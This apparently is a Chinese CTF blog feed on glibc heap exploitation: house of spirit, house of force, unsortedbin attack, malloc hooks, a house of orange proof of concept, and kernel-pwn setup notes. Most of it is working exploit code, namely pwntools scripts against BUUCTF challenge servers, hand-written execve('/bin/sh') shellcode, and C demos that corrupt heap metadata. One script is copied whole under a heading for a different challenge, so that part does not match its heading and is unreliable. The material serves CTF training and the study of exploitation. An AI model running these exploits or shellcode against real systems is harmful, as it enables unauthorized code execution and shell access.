<p>2.利用栈溢出来覆盖ptr的值（覆盖为rbp相关），可以利用此条件构造一个malloc_chunk（大尺寸），然后free掉再malloc达到可以更改rbp所指向的位置附近的值。而又因为rbp的bp-chain的性质，即可更改返回地址。</p>
<p>3.将返回地址更改为步骤2注入的shellcode的地址。因为步骤2可利用的空间有限，shellcode手写较好，不宜过长。</p>
<p>4.其中还有一些细节，如利用id来构造下一个chunk的size字段，绕过检查。</p>
</blockquote>
<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io= process(&quot;./pwn200&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27077</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">## 泄露地址</span></span><br><span class="line">io.sendafter(<span class="string">&quot;who are u?\n&quot;</span>,<span class="number">48</span>*<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">rbp = u64(io.recvuntil(<span class="string">b&quot;,&quot;</span>)[<span class="number">48</span>:<span class="number">48</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rbp con:&quot;</span>,<span class="built_in">hex</span>(rbp))</span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment">## 构造id字段，利用atoi，33会被转化为0x21</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;33&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 手写shellcode，push，pop所占机器码较少</span></span><br><span class="line">binpa = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rax,59</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;asm len:&quot;</span>,<span class="built_in">len</span>(binpa))</span><br><span class="line"><span class="comment">##溢出字段的构造</span></span><br><span class="line">payload = <span class="number">8</span>*<span class="string">b&#x27;\x00&#x27;</span>+binpa+<span class="number">4</span>*<span class="string">b&#x27;\x00&#x27;</span>+p64(<span class="number">0x41</span>)+<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(rbp-<span class="number">176</span>+<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;give me money~\n&#x27;</span>,payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;your choice : &quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;your choice : &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;how long?\n&quot;</span>,<span class="string">b&#x27;56&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="number">24</span>*<span class="string">b&#x27;a&#x27;</span>+p64(rbp-<span class="number">176</span>-<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="house-of-spirit（Arbitrary-Alloc）"><a href="#house-of-spirit（Arbitrary-Alloc）" class="headerlink" title="house_of_spirit（Arbitrary Alloc）"></a>house_of_spirit（<strong>Arbitrary Alloc</strong>）</h1><blockquote>
<p>以<a href="https://buuoj.cn/challenges#babyheap_0ctf_2017">BUUCTF在线评测 (buuoj.cn)</a>为例</p>
</blockquote>
<h2 id="本题思路-1"><a href="#本题思路-1" class="headerlink" title="本题思路"></a>本题思路</h2><ul>
<li>通过unsortedbin的双向链表泄露main_arena地址，得到libc基址，再通过将malloc_hook中注入onegadget拿到shell</li>
<li>此题有明显溢出，因此可以考虑吧overslap，凭着这个思路可以泄露address</li>
<li>通过复写fd，来达到任意地址写的目的，以此来注入onegadget</li>
</ul>
<h2 id="本题py-远程打不通，可以打通本地，搞不懂为什么"><a href="#本题py-远程打不通，可以打通本地，搞不懂为什么" class="headerlink" title="本题py(远程打不通，可以打通本地，搞不懂为什么)"></a>本题py(远程打不通，可以打通本地，搞不懂为什么)</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io= process(&quot;./pwn200&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27077</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">&quot;who are u?\n&quot;</span>,<span class="number">48</span>*<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">rbp = u64(io.recvuntil(<span class="string">b&quot;,&quot;</span>)[<span class="number">48</span>:<span class="number">48</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rbp con:&quot;</span>,<span class="built_in">hex</span>(rbp))</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;33&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binpa = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rax,59</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;asm len:&quot;</span>,<span class="built_in">len</span>(binpa))</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = 8*b&#x27;\x00&#x27;+binpa+3*b&#x27;\x00&#x27;+p64(0x11)+0x8*b&#x27;a&#x27;+p64(0x21)+p64(rbp-144)</span></span><br><span class="line"><span class="comment">#payload =  8*b&#x27;\x00&#x27;+p64(0x21)+binpa+3*b&#x27;\x00&#x27;+p64(0x21)+0x8*b&#x27;a&#x27;+p64(rbp-176)</span></span><br><span class="line">payload = <span class="number">8</span>*<span class="string">b&#x27;\x00&#x27;</span>+binpa+<span class="number">4</span>*<span class="string">b&#x27;\x00&#x27;</span>+p64(<span class="number">0x41</span>)+<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(rbp-<span class="number">176</span>+<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;give me money~\n&#x27;</span>,payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;your choice : &quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;your choice : &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;how long?\n&quot;</span>,<span class="string">b&#x27;56&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="number">24</span>*<span class="string">b&#x27;a&#x27;</span>+p64(rbp-<span class="number">176</span>-<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h1><blockquote>
<p>修改top的size字段使其极大，以至于达到可以任意地址分配的目的。</p>
<p>第一次分配先改变top的区域</p>
<p>第二次分配直接获得想要区域的读写权限</p>
</blockquote>
<h2 id="部分代码如下："><a href="#部分代码如下：" class="headerlink" title="部分代码如下："></a>部分代码如下：</h2><blockquote>
<p>此代码为高版本的malloc源码，低版本无：<code> if (__glibc_unlikely (size &gt; av-&gt;system_mem))</code>此判断语句，因此可以利用成功。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="demo："><a href="#demo：" class="headerlink" title="demo："></a>demo：</h2><blockquote>
<p>版本glibc2.23，高版本只要加了patch很容易使此攻击失效</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,ptr2;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">    ptr = (<span class="type">long</span>*)((<span class="type">long</span>)(ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">-4120</span>);</span><br><span class="line">    <span class="type">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,p3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的是<code>remainder = chunk_at_offset (victim, nb);</code>语句来改变top的指针指向，改编为victim+nb</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure>

<p>因此可以看出当malloc（负数）的时候，会将top的指针降低到bss段，以此来达到复写bss段的目的。</p>
<figure class="highlight plaintext"><figcaption><span>*p4 </span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## 习题：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#hitcontraining_bamboobox)</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">io = process(&quot;./bamboobox&quot;)</span><br><span class="line">#io = remote(&quot;node5.buuoj.cn&quot;,28639)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line">def create(size,content):</span><br><span class="line">    io.sendlineafter(&quot;Your choice:&quot;,b&#x27;2&#x27;)</span><br><span class="line">    io.sendlineafter(&quot;Please enter the length of item name:&quot;,size)</span><br><span class="line">    io.sendafter(&quot;Please enter the name of item:&quot;,content)</span><br><span class="line">def show():</span><br><span class="line">    io.sendlineafter(&quot;Your choice:&quot;, b&#x27;1&#x27;)</span><br><span class="line">    return io.recvuntil(&quot;\n&quot;).strip()</span><br><span class="line">def change(index,size,content):</span><br><span class="line">    io.sendlineafter(&quot;Your choice:&quot;, b&#x27;3&#x27;)</span><br><span class="line">    io.sendlineafter(&quot;Please enter the index of item:&quot;,index)</span><br><span class="line">    io.sendlineafter(&quot;Please enter the length of item name:&quot;,size)</span><br><span class="line">    io.sendafter(&quot;Please enter the new name of the item:&quot;,content)</span><br><span class="line">def remove(index):</span><br><span class="line">    io.sendlineafter(&quot;Your choice:&quot;, b&#x27;4&#x27;)</span><br><span class="line">    io.sendlineafter(&quot;Please enter the index of item:&quot;,index)</span><br><span class="line">def exit():</span><br><span class="line">    io.sendlineafter(&quot;Your choice:&quot;, b&#x27;5&#x27;)</span><br><span class="line">create(b&#x27;248&#x27;,24*b&#x27;a&#x27;)</span><br><span class="line">change(b&#x27;0&#x27;,b&#x27;256&#x27;,248*b&#x27;a&#x27;+p64(0xffffffffffffffff))</span><br><span class="line">create(b&#x27;-304&#x27;,8*b&#x27;a&#x27;)</span><br><span class="line">create(b&#x27;24&#x27;,8*b&#x27;a&#x27;+p64(0x0000000000400D49))</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">exit()</span><br><span class="line">print(io.recv())</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这道题漏洞很多，这个方法需要flag在正确路径，但是buu远程好像不在，因此需要换一种方法。</p>
<h1 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin_attack"></a>unsortedbin_attack</h1><h2 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h2><p>在malloc一个大块时，若unsortedbin中只有一个remindered块，那么就会进行脱链，传递给用户，当然尺寸得足够。</p>
<p>其中会执行<code>bck = victim-&gt;bk;..............;bck-&gt;fd = unsorted_chunks (av);</code>利用此可将bck+0x10所指向的位置的值变得极大。</p>
<p>但是在libc2.35中有指针检查，因此此利用方法在高版本应该会失效。具体patch为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line">          mchunkptr next = chunk_at_offset (victim, size);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (size &lt;= CHUNK_HDR_SZ)</span><br><span class="line">              || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ)</span><br><span class="line">              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line"><span class="comment">/*此处代码检查了bk指针的伪造，有效防止了此漏洞*/</span></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="例子：BUUCTF在线评测-buuoj-cn"><a href="#例子：BUUCTF在线评测-buuoj-cn" class="headerlink" title="例子：BUUCTF在线评测 (buuoj.cn)"></a>例子：<a href="https://buuoj.cn/challenges#hitcontraining_magicheap">BUUCTF在线评测 (buuoj.cn)</a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(<span class="string">&quot;./magicheap&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28462</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">def create(size,content):</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Your choice :&quot;</span>,b<span class="number">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Size of Heap : &quot;</span>,size)</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line">def edit(index,size,content):</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Your choice :&quot;</span>,b<span class="number">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Index :&quot;</span>, index)</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Size of Heap : &quot;</span>, size)</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Content of heap : &quot;</span>, content)</span><br><span class="line">def de(index):</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Your choice :&quot;</span>,b<span class="number">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="number">&#x27;</span>Index :<span class="string">&#x27;,index)</span></span><br><span class="line"><span class="string">def ex(index):</span></span><br><span class="line"><span class="string">    io.sendafter(b&quot;Your choice :&quot;,b&#x27;</span><span class="number">4&#x27;</span>)</span><br><span class="line">create(b<span class="number">&#x27;24&#x27;</span>,<span class="number">10</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line">create(b<span class="number">&#x27;1272&#x27;</span>,<span class="number">10</span>*b<span class="number">&#x27;b</span><span class="number">&#x27;</span>)</span><br><span class="line">create(b<span class="number">&#x27;24&#x27;</span>,<span class="number">10</span>*b<span class="number">&#x27;</span>c<span class="number">&#x27;</span>)</span><br><span class="line">de(b<span class="number">&#x27;1&#x27;</span>)</span><br><span class="line">edit(b<span class="number">&#x27;0&#x27;</span>,b<span class="number">&#x27;48&#x27;</span>,<span class="number">24</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>+p64(<span class="number">0x501</span>)+p64(<span class="number">0x0000000000602090</span>)+p64(<span class="number">0x0000000000602090</span>))</span><br><span class="line">create(b<span class="number">&#x27;1272&#x27;</span>,<span class="number">10</span>*b<span class="number">&#x27;e&#x27;</span>)</span><br><span class="line">io.sendafter(b<span class="string">&quot;Your choice :&quot;</span>,b<span class="number">&#x27;4869&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="meta">#gdb.attach(io)</span></span><br><span class="line"><span class="meta">#pause()</span></span><br></pre></td></tr></table></figure>



<h1 id="关于hook的一些说明"><a href="#关于hook的一些说明" class="headerlink" title="关于hook的一些说明"></a>关于hook的一些说明</h1><blockquote>
<p>当<code>__malloc_hook</code>和<code>__free_hook</code>中部位null的时候，在执行<code>__libc_free,__libc_malloc</code>会优先执行hook中的函数。</p>
</blockquote>
<p>代码可如下：glibc2.27</p>
<p><img src="/img/mypic/heap/hook.png" alt="hook"></p>
<p>但是在2.35中hook没有了，也就不存在此利用手法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Quickly check that the freed pointer matches the tag for the memory.</span></span><br><span class="line"><span class="comment">     This gives a useful double-free detection.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">char</span> *)mem;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> err = errno;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br></pre></td></tr></table></figure>























]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>heap利用</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>POC for Houseoforange</title>
    <url>/2024/08/21/houseoforange/</url>
    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote>
<p>具体调用链和条件，可看：<a href="https://bbs.kanxue.com/thread-280167.htm">https://bbs.kanxue.com/thread-280167.htm</a></p>
</blockquote>
<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><blockquote>
<p>glibc2.23，无跳表检查。</p>
<p>条件：1.可溢出修改topchunk的size字段</p>
<p>2.可溢出修改已经放入到unsortedbin中的链表</p>
<p>基本思想：将iolist链表的起始地址从stdeer转换为unsortedbin的地址，则及那个unsortedbin当成stdeer，构造其chain字段，指向一个fake的io结构体，而chain字段按偏移量来算恰好为smallbin[5]，也就是装0x60-0x70的大小的chunk的bin，因此需要将top的头伪造成0x61，伪造好所有结构体之后，申请一个大的chunk（大于unsortedbin中的否则则会split），然后top则会被装入smallbin，也就是说可以实现chain指向top头。</p>
<p>top[0]&#x3D;”\bin\sh”；writebase&lt;writeptr&#x3D;writeend；vtable指向top中的一块已经构造好的地方。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gcc-7 -c houseoforange.c -o orange.o</span></span><br><span class="line"><span class="comment">ld --dynamic-linker=/home/l/how2heap/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so    --rpath=/home/l/how2heap/glibc-all-in-one/libs/2.23-0ubuntu3_amd64    orange.o -o orange -lc</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">long</span> * fun = (<span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*释放topchunk进入unsortedbin */</span></span><br><span class="line">    <span class="type">long</span> * ptr1 = (<span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">long</span> * top = (ptr1+<span class="number">2</span>);</span><br><span class="line">    <span class="type">long</span> * top_size = ptr1+<span class="number">3</span>;</span><br><span class="line">    *top_size = *top_size &amp; <span class="number">0x0000000000000fff</span>;</span><br><span class="line">    <span class="type">long</span> * bck = top+<span class="number">3</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">/*伪造top */</span></span><br><span class="line">    top[<span class="number">0</span>] = <span class="number">0x0068735c6e69625c</span>;</span><br><span class="line">    *bck = top[<span class="number">2</span>]+<span class="number">0x9a8</span><span class="number">-0x10</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span>* <span class="title">top1</span> =</span>(<span class="keyword">struct</span> _IO_FILE*)top;</span><br><span class="line">    top1-&gt;_IO_write_base = (<span class="type">void</span> *)<span class="number">2</span>;</span><br><span class="line">    top1-&gt;_IO_write_ptr = top1-&gt;_IO_write_end =(<span class="type">void</span> *)<span class="number">3</span>;</span><br><span class="line">    *top_size = <span class="number">0x61</span>;</span><br><span class="line">    top1-&gt;_mode = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">void</span> * fake = (<span class="type">void</span>*)top;</span><br><span class="line">    <span class="type">long</span>* vtable = (<span class="type">long</span> *)(fake + <span class="number">216</span>);</span><br><span class="line">    <span class="comment">/*伪造虚表和结构体*/</span></span><br><span class="line">    *vtable = top+<span class="number">10</span>;</span><br><span class="line">    ((<span class="type">long</span> *)(*vtable))[<span class="number">3</span>]= &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*结果会打印*/</span></span><br><span class="line">root@L:/home/l/demoforheap# ./orange </span><br><span class="line">*** Error in `./orange<span class="number">&#x27;</span>: <span class="built_in">malloc</span>(): memory corruption: <span class="number">0x00007f7fdf8e0520</span> ***</span><br><span class="line">\bin\sh</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>POC</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>poc</tag>
      </tags>
  </entry>
  <entry>
    <title>KernelStart</title>
    <url>/2024/08/19/kernelpwnstart/</url>
    <content><![CDATA[<blockquote>
<p> 参考教程做个总结</p>
<p><a href="https://pawnyable.cafe/linux-kernel/introduction/introduction.html">https://pawnyable.cafe/linux-kernel/introduction/introduction.html</a></p>
</blockquote>
<h1 id="磁盘映像的挂载"><a href="#磁盘映像的挂载" class="headerlink" title="磁盘映像的挂载"></a>磁盘映像的挂载</h1><blockquote>
<p>可以本地修改，如修改初始化相关和符号表相关</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/*文件系统*/</span><br><span class="line"><span class="built_in">mkdir</span> root</span><br><span class="line">mount rootfs.img root</span><br><span class="line">/*cpio*/</span><br><span class="line"><span class="built_in">mkdir</span> root</span><br><span class="line"><span class="built_in">cd</span> root</span><br><span class="line">cpio -idv &lt; ../rootfs.cpio</span><br><span class="line">/*归档操作*/</span><br><span class="line">find . -print0 | cpio -o --format=newc --null &gt; ../rootfs_updated.cpio</span><br></pre></td></tr></table></figure>

<h1 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h1><h2 id="初始化相关"><a href="#初始化相关" class="headerlink" title="初始化相关"></a>初始化相关</h2><blockquote>
<p>当内核启动时，它首先运行一个程序。 该程序的路径因配置而异，但在大多数情况下，它位于 <code>/init</code>、<code>/sbin/init</code> 等中。</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">获得加载模块的基址</span><br><span class="line">*/</span><br><span class="line"><span class="built_in">cat</span> /proc/modules</span><br><span class="line"></span><br><span class="line">/*获得符号信息更改</span><br><span class="line">/home/l/kernelpwn/LK01/qemu/root/etc/init.d/S99pawnyable</span><br><span class="line">*/</span><br><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/kptr_restrict     <span class="comment"># 変更前</span></span><br><span class="line"><span class="comment">#echo 2 &gt; /proc/sys/kernel/kptr_restrict    # 変更後</span></span><br><span class="line">/*shell输入*/</span><br><span class="line">grep <span class="string">&quot;commit_creds&quot;</span> /proc/kallsyms</span><br><span class="line">--------------------------------------------------------------------------------------------</span><br><span class="line">/*获得root</span><br><span class="line">更改文件内容</span><br><span class="line">*/</span><br><span class="line">setsid cttyhack setuidgid 0 sh</span><br></pre></td></tr></table></figure>



<h2 id="qemu远程连接选项"><a href="#qemu远程连接选项" class="headerlink" title="qemu远程连接选项"></a>qemu远程连接选项</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">-gdb tcp::<span class="number">12345</span></span><br></pre></td></tr></table></figure>

